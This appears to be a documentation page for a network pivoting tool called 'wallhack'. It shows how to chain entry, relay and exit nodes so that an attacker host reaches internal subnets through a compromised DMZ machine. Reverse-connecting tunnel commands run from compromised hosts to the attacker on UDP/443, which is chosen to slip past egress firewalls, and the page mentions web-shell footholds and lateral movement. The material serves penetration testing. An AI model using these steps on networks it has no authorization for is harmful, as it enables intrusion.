---
title: Multi-Hop Example
description: Chain through intermediate relays to reach targets that cannot connect directly.
order: 8
---

# Multi-Hop Example

In this example, three hosts form a chain: an entry node (`10.0.0.5`), a DMZ host (`10.0.1.10`) acting as a relay, and an internal host with no direct path to the entry node. The DMZ host connects outward to the entry node and listens inward for the next hop. Once established, traffic to `192.168.1.0/24` and `192.168.2.0/24` routes through the internal host.

The binary reached the DMZ host via initial access — a web shell, exposed service, or similar foothold. From there, it was transferred to the internal host using whatever lateral movement is available: `scp`, a shared mount, or a simple HTTP server on the DMZ host.

{% trafficflow flow="10.0.0.5 (entry) -> 10.0.1.10 (DMZ) -> internal host -> 192.168.1.0/24, 192.168.2.0/24" label="Traffic Flow:" /%}

{% steps %}
{% step title="Attacker (10.0.0.5)" number=1 %}
An [entry node](/concepts) listening for the first hop on UDP/443. Port 443 is used here as it is commonly permitted through egress firewalls. The default transport is QUIC, which uses UDP.

{% codeblock code="wallhack entry --listen :443" /%}
{% /step %}

{% step title="DMZ Host (10.0.1.10)" number=2 %}
A [relay node](/concepts) connecting to the entry node on UDP/443 and listening for the next hop on port 6565. Port 6565 is an arbitrary internal port; any unused port reachable from the internal host works here.

{% codeblock code="wallhack relay --connect 10.0.0.5:443 --listen :6565" /%}
{% /step %}

{% step title="Internal Host" number=3 %}
An [exit node](/concepts) connecting back to the relay on port 6565.

{% codeblock code="wallhack exit --connect 10.0.1.10:6565" /%}
{% /step %}

{% step title="Configure Routes" number=4 %}
Add routes for the networks accessible through the internal host.

```bash
ip route add 192.168.1.0/24 dev tun0
ip route add 192.168.2.0/24 dev tun0
```
{% /step %}
{% /steps %}
